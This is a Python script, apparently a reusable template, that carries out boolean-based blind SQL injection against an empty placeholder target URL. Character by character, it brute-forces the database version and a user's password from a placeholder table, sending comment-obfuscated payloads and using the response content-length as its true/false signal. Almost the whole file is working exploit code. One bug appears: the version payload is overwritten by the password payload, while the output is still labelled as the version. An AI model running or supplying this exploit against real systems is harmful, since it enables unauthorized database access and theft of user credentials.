#!/usr/bin/env python
import sys
import re
import requests
from bs4 import BeautifulSoup
import urllib.parse

# Change the URL of SQLi
target=''

session = requests.Session()
dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$+'
flag = True
password = ""
temp_password = ""
TIME = 1
db_name = ""
output = ""
email = ""

def sqli(target):
    
    #r = requests.get(target)
    #s = BeautifulSoup(r.text, 'lxml')
    #print("Response Headers:")
    #print(r.headers)
    #print(int(r.headers['content-length']))
    #print()
    #print("Response Content:")
    #print(s.text)
    #print(s.findAll(text=re.compile('None Found')))
    #print(not s.findAll(text=re.compile('None Found')))
    #print ()
    print("--SQL Version--")

    Version_found=''
    Version_temp=""
    char_position=1
    flag=True
    print("Finding.....")
    while flag:
        flag=False
        for i in range(0,len(dictionary)):
            #payload = "AAAA')/**/or/**/(select/**/1)=1%23"
           # print(dictionary[i])
           # Chek Version 
            payload = "AAAA')/**/or/**/(select/**/substring(version(),'"+str(char_position)+"',1)='"+dictionary[i]+"')=1%23"
           # Check User password
            payload = "AAAA')/**/or/**/(select/**/substring(password,'"+str(char_position)+"',1)/**/from/**/xxxx/**/where/**/xxxx/**/=1)/**/=/**/'"+dictionary[i]+"'%23"
      
            r = session.get(target+payload)
            
            s = BeautifulSoup(r.text, 'lxml')
            #print("DB Version found:"+ Version_temp)
            # True-based
            if (int(r.headers['content-length']) == 180):
                flag=True
                Version_temp+=dictionary[i]
                char_position = char_position+1
                break
        print("DB Version found:"+ Version_temp)
            
    


def main():
    
    # Verify the Blind SQLi
    sqli(target)

    print()
    print("End.")


if __name__ == "__main__":
    main()
